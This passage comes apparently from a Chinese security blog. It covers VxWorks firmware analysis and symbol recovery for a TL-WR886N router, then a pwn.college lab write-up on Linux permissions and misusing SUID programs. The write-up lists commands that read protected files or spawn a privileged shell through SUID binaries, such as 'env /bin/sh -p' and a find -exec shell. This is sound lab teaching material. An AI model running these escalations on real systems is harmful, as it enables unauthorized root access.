LTD.&quot;<br>1985044       0x1E4A14        VxWorks WIND kernel version &quot;2.6&quot;<br>2028656       0x1EF470        HTML document header<br>2028721       0x1EF4B1        HTML document footer<br>2048248       0x1F40F8        PEM certificate<br>2048304       0x1F4130        PEM RSA private key<br>2062120       0x1F7728        Base64 standard index table<br>2097416       0x200108        CRC32 polynomial table, big endian<br>2098440       0x200508        CRC32 polynomial table, big endian<br>2099464       0x200908        CRC32 polynomial table, big endian<br>2100488       0x200D08        CRC32 polynomial table, big endian<br>2120928       0x205CE0        XML document, version: &quot;1.0&quot;<br>2140268       0x20A86C        SHA256 hash constants, big endian<br>2237001       0x222249        StuffIt Deluxe Segment (data): f<br>2237032       0x222268        StuffIt Deluxe Segment (data): fError<br>2237113       0x2222B9        StuffIt Deluxe Segment (data): f<br></code></pre></td></tr></table></figure><h3 id="确定固件加载地址"><a href="#确定固件加载地址" class="headerlink" title="确定固件加载地址"></a>确定固件加载地址</h3><h4 id="通过MyFirmware指纹找加载地址"><a href="#通过MyFirmware指纹找加载地址" class="headerlink" title="通过MyFirmware指纹找加载地址"></a>通过MyFirmware指纹找加载地址</h4><p>部分flash中存在“MyFirmware”字符串，定位到该字符串。</p><p>往前找到上一个段的末尾，当前段开始的位置，一般上个段末尾会使用0xFF或0x00补齐。当前段开头偏移0x18处的两个4字节就是VxWorks系统映像的加载地址0x80001000。</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ%E6%88%AA%E5%9B%BE20240228114550.png"></p><h4 id="逆向ubootimage找加载地址"><a href="#逆向ubootimage找加载地址" class="headerlink" title="逆向ubootimage找加载地址"></a>逆向ubootimage找加载地址</h4><p>找到可疑字符串<code>vxWorks.bin from =0x%x, len=0x%x\n</code>，查看引用它的函数.</p><p>猜测sub_8001DA90函数的作用是将上电后映射到内存的rom中的firmware复制至<code>RAM_LOW_ADRS</code></p><p>可得ubootimg基址为0x80001000,上电后bootstrap的加载基址0x9F000000.</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ%E6%88%AA%E5%9B%BE20240228120851.png"></p><h3 id="恢复VxWorks系统映像符号表"><a href="#恢复VxWorks系统映像符号表" class="headerlink" title="恢复VxWorks系统映像符号表"></a>恢复VxWorks系统映像符号表</h3><p><a href="https://cn-sec.com/archives/1529385.html">参考文章</a></p><p><a href="https://www.uio.no/studier/emner/matnat/fys/FYS4220/h11/undervisningsmateriale/laboppgaver-rt/vxworks_bsp_developers_guide_6.0.pdf">VxWorks 6.0 BSP手册</a></p><p><a href="https://www.uio.no/studier/emner/matnat/fys/FYS4220/h11/undervisningsmateriale/laboppgaver-rt/vxworks_architecture_supplement_6.2.pdf">VxWorks Architecture Supplement, 6.2</a></p><p>ida中查看<code>imports</code>和<code>Exports</code>都是空的,说明文件没有符号表. </p><p>VxWorks使用外部符号文件,只要能找到符号文件,导入符号表就能恢复原本的函数名,更方便逆向.</p><h4 id="寻找外部符号文件"><a href="#寻找外部符号文件" class="headerlink" title="寻找外部符号文件"></a>寻找外部符号文件</h4><p>符号文件中包含各种函数名字符串,VxWorks BSP手册中可以看到一些必定出现的重要函数名如<code>usrInit</code>、<code>bzero</code>、<code>bfill</code>等，因此可以根据是否包含这些字符串查找符号文件。</p><p><code>binwalk -Me</code>提取固件，在提取后的目录中搜索包含<code>usrInit</code>的文件，可以确定<code>B65E2</code>就是系统映像的外部符号文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">grep -r usrInit .</span><br>Binary file ./B65E2 matches<br>Binary file ./_B65E2.extracted/1056C.sit matches<br></code></pre></td></tr></table></figure><p>如果搜索包含<code>bzero</code>的文件，发现1481D0也符合要求，其为有符号表的ELF可执行文件，用ida进行简单逆向发现其包含Blowfish加密算法及网络相关函数。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">grep -r bzero .</span><br>Binary file ./B65E2 matches<br>Binary file ./1481D0 matches<br></code></pre></td></tr></table></figure><h4 id="符号文件格式"><a href="#符号文件格式" class="headerlink" title="符号文件格式"></a>符号文件格式</h4><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ%E6%88%AA%E5%9B%BE20240229000137.png"></p><p>每个外部符号文件的开头4字节表示当前符号文件大小，例如该符号文件大小为126801&#x3D;0x1EF51。</p><p>紧跟的四字节表示符号条目数,每8字节一个条目，该条目数乘8再加8的偏移处开始为函数名字符串区块，例如该符号文件中0x1372*8+8&#x3D;0x9B98，如下图。</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ%E6%88%AA%E5%9B%BE20240229000742.png"></p><p>开头8字节后每8字节表示一个条目信息，分为三部分：符号类型(1字节)、该函数名在函数名字符串区块中的偏移(3字节)、该函数在VxWorks系统映像中加载后的基址(4字节)，用结构体表示如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sym_info</span>&#123;</span><br><span class="hljs-type">char</span> type;<br><span class="hljs-type">char</span> offset[<span class="hljs-number">3</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> address;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="恢复符号表"><a href="#恢复符号表" class="headerlink" title="恢复符号表"></a>恢复符号表</h4><p>使用ida python编写脚本，类似的脚本网上有很多，改一改即可</p><p><a href="https://hex-rays.com//products/ida/support/idapython_docs/">ida python手册</a></p><p><a href="https://cloud.tencent.com/developer/article/2063716?areaSource=102001.18&traceId=GbrDTuebolNXHZNDqQXz6">python2参考</a></p><p><a href="https://blog.csdn.net/qq_42765117/article/details/132224013">python3参考</a></p><p>这里使用python3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding:utf-8</span><br><span class="hljs-comment">#symfile_path: 刚刚搜索到的符号文件的路径</span><br><span class="hljs-comment">#symbols_table_start : 符号表起始偏移，从16进制编辑器看出来是8（前8字节作用不清楚，也不重要）</span><br><span class="hljs-comment">#strings_table_start : 字符串起始偏移，也是从16进制编辑器看出来</span><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> idautils<br><span class="hljs-keyword">import</span> idc<br><span class="hljs-keyword">import</span> idaapi<br><span class="hljs-keyword">import</span> ida_funcs<br> <br>symfile_path = <span class="hljs-string">r&quot;D:\系统默认\桌面\网安\笔记\iot\Firmwares\TL-WR886N/B65E2&quot;</span><br>symbols_table_start = <span class="hljs-number">8</span><br>strings_table_start = <span class="hljs-number">0x9B98</span><br> <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(symfile_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    symfile_contents = f.read()<br> <br>symbols_table = symfile_contents[symbols_table_start:strings_table_start]<br>strings_table = symfile_contents[strings_table_start:]<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_string_by_offset</span>(<span class="hljs-params">offset</span>):<br>    index = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> strings_table[offset+index] != <span class="hljs-number">0</span>:<br>            index += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> strings_table[offset:offset+index]<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_symbols_metadata</span>():<br>    symbols = []<br>    <span class="hljs-keyword">for</span> offset <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(symbols_table),<span class="hljs-number">8</span>):<br>        symbol_item = symbols_table[offset:offset+<span class="hljs-number">8</span>]<br>        flag = symbol_item[<span class="hljs-number">0</span>]<br>        string_offset = <span class="hljs-built_in">int</span>(binascii.b2a_hex((symbol_item[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>])).decode(<span class="hljs-string">&quot;ascii&quot;</span>), <span class="hljs-number">16</span>)<br>        string_name = get_string_by_offset(string_offset)<br>        target_address = <span class="hljs-built_in">int</span>(binascii.b2a_hex((symbol_item[-<span class="hljs-number">4</span>:])).decode(<span class="hljs-string">&quot;ascii&quot;</span>), <span class="hljs-number">16</span>)<br>        symbols.append((flag, string_name, target_address))<br>    <span class="hljs-keyword">return</span> symbols<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_symbols</span>(<span class="hljs-params">symbols_meta_data</span>):<br>    <span class="hljs-keyword">for</span> flag, string_name, target_address <span class="hljs-keyword">in</span> symbols_meta_data:<br>        idc.set_name(target_address, string_name.decode(<span class="hljs-string">&quot;utf8&quot;</span>)) <span class="hljs-comment">#命令目标地址的数据，数据类型由flag而定</span><br>        <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0x54</span>:                 <span class="hljs-comment">#类型T，表示是text段的符号，text段的符号一般是函数符号，所以在命名后还要将目标地址设置为函数</span><br>            idc.create_insn(target_address)   <span class="hljs-comment">#确保target_address有指令</span><br>            ida_funcs.add_func(target_address)  <span class="hljs-comment">#将target_address定义为函数并自动寻找边界</span><br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    symbols_metadata = get_symbols_metadata()<br>    add_symbols(symbols_metadata)<br></code></pre></td></tr></table></figure><p>修复成功</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ%E6%88%AA%E5%9B%BE20240229161428.png"></p>]]></content>
    
    
    <categories>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
      <tag>固件提取</tag>
      
      <tag>TL-WR886N</tag>
      
      <tag>VxWorks</tag>
      
      <tag>uart调试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PwnCollege - Fundamentals - ProgramMisuse</title>
    <link href="/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/"/>
    <url>/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/</url>
    
    <content type="html"><![CDATA[<h1 id="PwnCollege-Fundamentals-ProgramMisuse"><a href="#PwnCollege-Fundamentals-ProgramMisuse" class="headerlink" title="PwnCollege - Fundamentals -ProgramMisuse"></a>PwnCollege - Fundamentals -ProgramMisuse</h1><p>网址：<a href="https://pwn.college/">https://pwn.college/</a></p><h2 id="Using-The-Dojo-the-welcome-module"><a href="#Using-The-Dojo-the-welcome-module" class="headerlink" title="Using The Dojo  - the welcome  module"></a>Using The Dojo  - the welcome  module</h2><p>访问靶机的三种方式:在Workspace的Vscode中打开终端、在Desktop中操作靶机桌面以及通过ssh连接至靶机。另外，靶机的&#x2F;home&#x2F;hacker目录是持久化的，也就是说每次开启新的挑战，&#x2F;home&#x2F;hacker目录不会被重置。</p><p>靶机分为两种模式：challenge和practice,在practice模式中有可调试的解决方案，但是flag是假flag。</p><p>ssh连接步骤：</p><p>1.运行<code>ssh-keygen -f key -N &#39;&#39;</code>命令，这会在当前目录下生成key和key.pub文件，分别是公钥和私钥。</p><p>2.<code>cat key.pub</code>打印key.pub文件内容。</p><p>3.将打印出的内容复制粘贴到Settings-&gt;SSH Key中。</p><p>4.<code>ssh -i key hacker@dojo.pwn.college</code>连接至靶机</p><p>Desktop中的复制粘贴:</p><p>打开剪切板，在网页虚拟机中选中的文字会直接被写入剪切板中，可以从剪切板中复制文字到本机;同理，要把外部的内容复制到虚拟机中只需将要复制的文字从本机复制到剪切板中，再在网页虚拟机中粘贴。</p><h2 id="Fundamentals-Program-Misuse"><a href="#Fundamentals-Program-Misuse" class="headerlink" title="Fundamentals - Program Misuse"></a>Fundamentals - Program Misuse</h2><h3 id="程序交互：Linux-命令行"><a href="#程序交互：Linux-命令行" class="headerlink" title="程序交互：Linux 命令行"></a>程序交互：Linux 命令行</h3><p>文件类型、文件查看、软连接和硬链接、inode</p><h3 id="程序滥用：权限提升-linux权限模型"><a href="#程序滥用：权限提升-linux权限模型" class="headerlink" title="程序滥用：权限提升 - linux权限模型"></a>程序滥用：权限提升 - linux权限模型</h3><p><a href="https://gnu-linux.readthedocs.io/zh/latest/Chapter03/00_permission.html">参考</a></p><p>(1)用户和组信息</p><p>用户和组分别用 <code>UID</code> 和 <code>GID</code> 表示，一个用户可以同时属于多个组，默认每个用户必属于一个与之 UID 同值同名的 GID。</p><p>通过<code>id</code>命令可以查看用户的UID和GID。</p><p>系统保存用户信息的文件是 <code>/etc/passwd</code> ，保存组信息的文件是 <code>/etc/group</code> ，保存密码口令及其变动信息的文件是 <code>/etc/shadow</code> 。</p><p>(2)文件权限控制</p><p>文件的权限分为三组：U(所有者, Owner), G(用户组, Group), O(其他, Other），而每组又由三个权限位构成，分别为r(读权限), w(写权限), x(可执行权限)。 </p><p>通过 <code>ls -l</code> 可以查看到其文件类型及权限，通过 <code>chmod</code>修改权限，通过 <code>chown</code> 改变文件或目录的所属用户，通过 <code>chgrp</code> 改变文件或目录的所属组。</p><p><img src="/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/1.jpg" alt="1"></p><p>虽然显示linux权限位是9位，但事实上linux权限位有12位，除了上述的9位外还有SUID，SGID和sticky位,其位置如下：</p><p>S G T r w x r w x r w x</p><p>例如<code>- rws r-x r--</code>对应的12位权限位的数值为100 111 101 100</p><p>SUID(set user id)和SGID(set group id)：</p><p>可通过<code>chmod u+s</code>和<code>chmod g+s</code>设置，只有具有对应可执行权限的<strong>可执行程序</strong>能够设置SUID和SGID，设置后x变为s。当对一个不具备 x 权限的文件设置 s 权限时无效，权限变为大写 S，表明 s 权限未生效。该类文件被执行后进程的有效id为文件拥有者&#x2F;组的id，而正常可执行文件执行后进程的有效id为执行者的用户&#x2F;组id。</p><p>Strick(粘滞位)：</p><p>一般对目录针对 others 设置，设置后在目录中只有属主和 root 有删除文件的权限，即用户只能删除自己为属主的文件（多用于共享目录中）。可通过<code>chmod +t</code>和<code>chmod -t</code>设置和删除，设置后others的x位显示为t，只有others有可执行权限的文件设置该位才有效(具有写和执行权限才能在目录下进行文件创建删除等操作)，others没有可执行权限的文件设置后其others的x位显示为T。</p><p>(3)进程权限控制</p><p>进程的id称为进程凭证，包括了真实用户id(read user id,ruid)和真实组id(read group id,rgid)，有效用户id(effective user id,euid)和有效组id(effective group id,egid)，设置用户id(saved set user id)和设置组id(saved set group id)，文件系统用户id(fsuid)和文件系统组id(fsgid)，辅助组id(Supplementary Group ID)。</p><p>注意：saved set-user-id是进程id，而set-user-id(suid)是文件的特殊权限，group id同理</p><ul><li><p><code>ruid</code> 和 <code>rgid</code>标识了该进程属于哪一个用户（哪一个组）。子进程的真实id继承自创建它的父进程，shell进程的真实id会在用户登陆时被login进程使用setuid等函数设置为用户的uid和gid。</p></li><li><p><code>euid</code>和<code>egid</code>用于决定进程对系统资源的访问权限（除了文件访问），操作系统对访问权限的验证依据的是有效id而不是真实id(但进程间signal发送会检查真实id或有效id是否匹配)。有效id为0的特权进程拥有所有权限(root)。一般进程的euid和egid复制自ruid和rgid，由具有suid和sgid的可执行文件生成的进程的euid和egid复制自可执行文件的所属用户id和所属组id。</p></li><li><p><code>saved set user id</code>和<code>saved set group id</code>。在进程被创建时直接复制自euid和egid，其作用是：存在真实id为非root，原始有效id为root的情况，保存原始有效id以便进程可以通过setuid使得有效id在真实id和原始有效id(root)之间切换。可以看下图中的例子，<a href="https://www.cnblogs.com/alantu2018/p/8457458.html">来源</a>。</p></li></ul><p><img src="/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/QQ%E6%88%AA%E5%9B%BE20240119205610.png" alt="2"></p><ul><li><p><code>fsuid</code>和<code>fsgid</code>。这两个ID是linux特有的，传统unix并没有这些ID。对于传统的unix，访问文件、发送signal，打开IPC的object等等的权限都是依据effective ID判断。对于linux，其余的权限仍然依据effective ID判断，但是对于文件的访问则使用file-system user ID 和 file-system group ID（配合supplementary group ID）。在不刻意使用系统调用<code>setfsuid</code>和<code>setfsgid</code>来设定文件系统id的情况下，文件系统id和有效id完全相同，如果通过系统调用修改有效ID，文件系统ID也会随之修改。事实上，该id是linux kernel早期版本为了NFS的安全问题引入的，kernel 2.0之后就应该被废弃了，但为了软件的兼容性，linux kernel仍然保留了这两个file-system ID。</p></li><li><p><code>Supplementary Group ID</code>是进程所属的额外组。创建进程的用户可能属于多个组，第一个组作为进程的gid，其余的保存在辅助组id中。一般进程从父进程中继承这些IDs。shell进程通过login进程从系统组文件（&#x2F;etc&#x2F;group）中获取辅助组IDs。</p></li></ul><p>操作系统通过如下方式确定进程访问文件的类别</p><ul><li>检查以及确认资源(文件)的所有权和组所有权</li><li>检查进程目前具有哪个访问类别(譬如，U|G|O)</li><li>针对相应的访问类别，相应的权限位是否设置(譬如 w设置为1，则允许写文件)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> process_UID == file_UID<br> then<br>      access_category = U<br> <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> process_GID == file_GID<br> then<br>      access_category = G<br> <span class="hljs-keyword">else</span><br>      access_category = O<br> fi<br></code></pre></td></tr></table></figure><p>进程凭证的获取和修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">uid_t</span> <span class="hljs-title function_">getuid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;    <span class="hljs-comment">//获取实际用户id</span><br><span class="hljs-type">uid_t</span> <span class="hljs-title function_">geteuid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;   <span class="hljs-comment">//获取有效用户id</span><br><br><span class="hljs-type">gid_t</span> <span class="hljs-title function_">getgid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;    <span class="hljs-comment">//获取实际组id</span><br><span class="hljs-type">gid_t</span> <span class="hljs-title function_">getegid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;   <span class="hljs-comment">//获取有效组id</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">setuid</span><span class="hljs-params">(<span class="hljs-type">uid_t</span> uid)</span>;  <span class="hljs-comment">//设置实际用户id，有效用户id，保存用户id</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">setgid</span><span class="hljs-params">(<span class="hljs-type">gid_t</span> gid)</span>;  <span class="hljs-comment">//设置实际组id，实际有效组id，实际保存组id</span><br></code></pre></td></tr></table></figure><p>setuid系统调用的语法是 setuid(uid) ，其中，uid是新的用户ID，该系统调用的结果取决于有效用户ID的当前值。如果调用进程的有效用户ID是超级用户，内核会把进程表以及u区中的真实和有效用户ID都设置成uid。如果调用进程的有效用户ID不是超级用户，仅当uid等于真实用户ID或保存用户ID时，内核才会把u区中的有效用户ID设置成uid。否则，该系统调用将返回错误。一般来说，一个进程会在fork系统调用期间从父进程那儿继承它的真实和有效用户ID，这些数值即使经过exec系统调用也会保持不变。</p><p>1.当非特权进程调用setuid()时，只能修改进程的有效用户id，而且只能将有效用户id改成相应的实际用户id。<br>2.特权用户调用setuid()设置uid为非0时，会同时设置实际用户id，有效用户id，和保存设置用户id，且为单向的，因为设置了之后进程就失去了特权。</p><h3 id="程序滥用：缓解措施"><a href="#程序滥用：缓解措施" class="headerlink" title="程序滥用：缓解措施"></a>程序滥用：缓解措施</h3><p>例1：&#x2F;bin&#x2F;sh 命令注入缓解措施</p><p>如果&#x2F;bin&#x2F;sh在设置了suid的情况下运行导致ruid!&#x3D;0但euid&#x3D;&#x3D;0,那么会进行自动降权，使euid &#x3D; ruid。也就是说&#x2F;bin&#x2F;sh只有在ruid和euid都是0时才有root权限。可通过sh -p启动shell来关闭该特性。</p><p>例2：wireshark的协议解析部分存在较大的攻击面，如果以root身份运行该部分可能导致严重后果，因此作者将wireshark分成两部分，dumpcap和wireshark分别用来抓包和分析协议，只有dumpcap需要root权限。</p><p>通常我们使用沙箱来缓解程序滥用，使程序运行在无法接触到敏感数据和权限的环境中。</p><h3 id="challenges"><a href="#challenges" class="headerlink" title="challenges"></a>challenges</h3><p>给出一个有suid权限的程序，使用这个程序来读flag或<strong>提权</strong></p><p><strong>直接读取</strong></p><p>cat,more,less,tail,head,sort</p><p><strong>文本编辑器</strong></p><p>vim,emacs,nano</p><p>其中emacs会有如下报错：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">This process is currently running setuid or setgid.<br>This is not a supported use of GTK+. You must create a helper<br>program instead. For further details, see:<br><br>    http://www.gtk.org/setuid.html<br><br>Refusing to initialize GTK+.<br></code></pre></td></tr></table></figure><p>参考<a href="https://www.gtk.org/setuid.html">这里</a>以及该<a href="https://j-shiro.github.io/p/pwncollege_note1/">博客</a>，可以通过添加-nw参数解决，该参数的作用是使启动时不开启GUI界面。</p><p>报错原因：emacs默认指向emacs-gtk，在启动时自带GUI。而GTK的图形化接口易受攻击，开发者为了降低安全风险，禁止了普通用户运行设置了suid的emacs-gtk程序。</p><p><img src="/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/QQ%E6%88%AA%E5%9B%BE20240121111515.png" alt="3"></p><p><strong>文本操作</strong></p><p>10.rev</p><p>对输入进行逆置，把输出再逆置一遍就行</p><p>11.od</p><p>参数如下，-c即可</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">-<span class="hljs-selector-tag">b</span>:octal-x -h:hex<br>-c:ASCII-d:<span class="hljs-built_in">Decimal</span>(ten)<br></code></pre></td></tr></table></figure><p>12.hd  - hexdump，直接查看即可</p><p>13.xxd - - 16进制查看器，直接查看即可</p><p>14.base32    把输出的加密flag用base32 -d解密即可</p><p>15.base64 同base32</p><p>16.split  用于分割数据，分割后的数据块保存在当前所在目录的不同文件中，文件名类似xaa,xab….</p><p><strong>文件压缩命令</strong></p><p>17.gzip</p><p>先压缩<code>gzip /flag</code>,flag文件压缩后变为flag.gz，再<code>gzip -d -c /flag.gz</code>，-d表示解压，-c表示直接输出结果</p><p>18.bzip2</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">/usr/bin/bzip2 -d -c /flag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">/usr/bin/bzip2 -d -c /flag.bz2</span><br></code></pre></td></tr></table></figure><p>19.zip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">zip /flag.zip /flag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag.zip</span><br></code></pre></td></tr></table></figure><p>20.tar </p><ul><li>-c或–create 建立新的备份文件。</li><li>-f&lt;备份文件&gt;或–file&#x3D;&lt;备份文件&gt; 指定备份文件。</li><li>-x或–extract或–get 从备份文件中还原文件。</li><li>-O或–stdout 把从备份文件里还原的文件输出到标准输出设备。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -cf flag.tar.gz flag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -x -O -f flag.tar.gz</span><br></code></pre></td></tr></table></figure><p>21.ar</p><ul><li>-r 　将文件插入备存文件中。</li><li>v 　程序执行时显示详细的信息。</li><li>-p 　显示备存文件中的成员文件内容。</li><li>-x 　自备存文件中取出成员文件。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ar rv flag.bak /flag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">ar -p flag.bak</span><br></code></pre></td></tr></table></figure><p>22.cpio</p><ul><li><p>-o或–create 　执行copy-out模式，建立备份档。</p></li><li><p>-i或–extract 　执行copy-in模式，还原备份档。</p></li></ul><p>输入<code>cpio -o</code>+回车后进入copy-out模式，输入<code>/flag</code>，再ctrl + d完成输入，输出的内容就是新建的备份档，其中包含flag，一般创建备份档时会将其重定向至.cpio文件中。</p><p>23.genisoimage<br>该命令用于创建ISO9660格式的光盘文件系统镜像</p><p><code>-sort FILE</code>参数用于对文件写入镜像的顺序进行排序，FILE文件用于描述排序时的文件名和对应的权重。当FILE的文件格式(文件名+权重)错误导致解析失败时，文件内容会被在错误消息中打印出来。</p><p><a href="https://gtfobins.github.io/gtfobins/genisoimage/">参考</a> <a href="https://linux.die.net/man/1/genisoimage">genisoimage手册</a> <a href="https://www.apt-browse.org/browse/debian/jessie/main/all/cdrkit-doc/9:1.1.11-3/file/usr/share/doc/cdrkit-doc/genisoimage/README.sort">README.sort</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">/usr/bin/genisoimage -<span class="hljs-built_in">sort</span> /flag</span><br></code></pre></td></tr></table></figure><p><strong>通过suid程序间接执行其它命令提权</strong></p><p>24.env </p><ul><li><p>直接运行显示系统的环境变量</p></li><li><p><code>env cmd</code>在当前环境下执行命令</p></li><li><p><code>env -u name </code>删除变量</p></li><li><p><code>env -i</code>开启一个新的空环境</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">env</span> /bin/sh -p</span><br></code></pre></td></tr></table></figure><p>25.find</p><p>用于在指定目录下查找文件和目录。可以使用不同的选项来过滤和限制查找的结果。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">find <span class="hljs-selector-attr">[路径]</span> <span class="hljs-selector-attr">[匹配条件]</span> <span class="hljs-selector-attr">[动作]</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find /bin/ -name &quot;sh&quot; -exec &#123;&#125; -p \; 